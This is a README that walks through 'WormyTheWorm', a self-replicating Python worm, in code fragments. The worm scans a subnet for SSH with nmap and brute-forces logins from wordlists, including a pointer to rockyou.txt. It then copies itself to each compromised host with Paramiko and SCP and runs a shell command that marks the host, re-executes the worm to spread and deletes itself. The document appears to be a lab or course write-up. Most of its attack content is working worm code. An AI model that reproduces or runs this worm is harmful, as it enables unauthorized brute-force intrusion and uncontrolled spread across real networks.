# WormyTheWorm
___

## Summary: 
> A Python worm that scans & infects a given subnet while replicating itself. 
> Below is a breakdown of the code, including screenshots & descriptions of the processes used. (WormyTheWorm.py)

## Table of Contents
- [Dependencies](#dependencies)
- [NMAP](#nmap)
- [Brute Force](#brute-force) 
- [SSH and Paramiko](#ssh-and-paramiko)
- [Try/Except loop for SSH & SCP via Paramiko](#try-except-loop-for-SSH-and-SCP-via-Paramiko)
- [Output](#output)
___
## Dependencies 
&NewLine; 
```sh
import nmap
import paramiko
import sys
from scp import SCPClient
```

The functions above must be installed on the local machine for the program to run successfully. Run the 3 commands below to install each successfully. 

**Pip:**
```sh
sudo apt install python3-pip
```
**NMap:**
```sh
sudo apt-get install nmap
```
**Requirements:**

Download the configuration file called **requirements.txt** from this repository, move it to your current directory, then run the following command:
```sh
pip install -r requirements.txt
```

## NMap

NMap is used to scan a given subnet & return all host IPs on the network. 

**NMap Explained**

1. A variable is defined that calls the port scanner method. 
2. **The target subnet is identified - the default port will always be 22 for SSH utilization.**
3. The command line method is initialized. 
```sh
nmScan = nmap.PortScanner()
nmScan.scan('10.0.0.0/24', '22')
nmScan.command_line()
```
1. A list called "networkhosts" is defined, which will contain the IPv4 addresses located on the subnet. 
2. A "for" loop is intialized. This loop iterates through all hosts & stores them via the append method in "networkhosts", defined above. 
```sh
networkhosts = []
for host in nmScan.all_hosts():
    networkhosts.append(host)
print(networkhosts)
```
3. "networkhosts" is printed out on the command line, showing us the list of IPv4 addresses on our subnet.

![IPs on the subnet](./printedipv4.png)

## Brute Force 

The brute force method of username / password cracking takes predefined wordlists & runs all possible combinations against a log-in barrier. The size of the wordlist will effect the success rate, but increased wordlist length correlates to an increase in time. In our example code, small wordlists of four usernames & four passwords are defined for the sake of time, but could be substituted for a longer list (such as rockyou.txt) using the path provided below: 
```sh
/usr/share/wordlists/rockyou.txt
```
The variables used by SSH/Paramiko (explained in further section) are defined in a "for" loop that will ultimately iterate through each host previously amended to "networkhosts". 
```sh
for element in networkhosts:
    host = element
    port = 22
```
The wordlists referenced above are also defined. 
```sh
usernames = ['sam','gavin','stephen','devon']
passwords = ['admin','stephen','penelope','password']
```

## SSH and Paramiko

Paramiko is Python's implementation of SSHv2 proctocol and is the crux of WormyTheWorm's ability to infiltrate hosts on a local network. 

First, two subsequent "for" loops utilize the word lists defined in the "Brute Force" section above. Each "for" loop combination contains a different combination of "users" & "pwords", and SSH is attempted via Paramiko using each one. The variables "username" and "password", which are native to Paramiko, are defined. 

```sh
for user in usernames:
        for pword in passwords:
            username = user
            password = pword
```
Next, the "command" variable is defined. This sequence is executed via the target machine's command line once SSH connection is established. This command in particular performs the following:

 1. First, it checks to see if the machine has been infected by looking for a hidden file called ".WormyIsHiding" that is created by the script below.
 2. ".WormyIsHiding", a hidden file, is created on the target machine.
 3. A file called "WormyWuzHere" is created containing the following text: "Haha no code for you :)".
 4. WormyTheWorm is executed - this is how the worm replicates. Identical code will be executed on the target machine, and the process will begin anew. 
 5. WormyTheWorm removes itself.
```sh
command = "if [ ! -f .WormyIsHiding ]; then touch .WormyIsHiding && touch 'WormyWuzHere' && echo 'Haha no code for you :)' > WormyWuzHere && ./WormyTheWorm 2> /tmp/output.log; fi && rm -f WormyTheWorm"
```
The first line of the code below creates a new SSHCLient, and the second line allows the script to SSH to a remote server with unknown SSH keys. 
```sh
ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()
```
## Try Except loop for SSH and SCP via Paramiko

A "try block" & an "except block" are used to set a timeout limit & an appropriate response, to increase the speed of Wormy as a whole. 

Within the "try block" the following occurs (in order):
1. ssh.connect is initialized, utlizing the previously defined username, password, and host variables. The timeout is set at 5 seconds. 
2. SCP variable is defined intliazed using the SCPClient via a get_transport request. This allows the WormyTheWorm file to be transported to the host machine in preparation for execution & replication. 
3. An SCP put request that references the first item on the command line (WormyTheWorm executable) is inialized. This step places the file onto to the target machine. 
4. The previously defined command in executed on the target machine. 
5. If the above works as it should within the time limit, a message displaying the host IP & "Success :)" will be displayed. 
```sh
 try:
        ssh.connect(host, port, username, password, timeout=5)
        scp = SCPClient(ssh.get_transport())
        scp.put(sys.argv[0])
        stdin, stdout, stderr = ssh.exec_command(command)
        print(host + ' Success :)')
```
Within the "except block" the following occurs:
1. If the "try block" is unsuccessful, a message displaying the host IP & "Timeout :(" will be displayed. 
```sh
 except:
        print(host + ' Timeout :(')
```

## Output

The command line on the attacker's machine shows us a log of each attempt to **gain access to a target using a specific username and password combination.** The image below shows a portion of that log.

![output log](./log.png)

After the success on 10.0.0.154, Wormy attempts to brute force 10.0.0.188, the next target.

After the script runs, the ```ls``` command on the target machines' terminals will show if the attack was successful. If it was, "WormyTheWorm" will be included in the output. (```ls``` shows all of the files in the current directory; right after a login, ```ls``` refers to the home directory).

![wormy ls](./lswithwormy.png)

Once WormyTheWorm copies itself onto another machine, it will automatically run again. Once it finishes, it will remove itself from the machine, and create "WormyWuzHere" in the same directory. Once again, ```ls``` will show if the script ran successfully.

![wormy's tracks](./wormtracks.png)










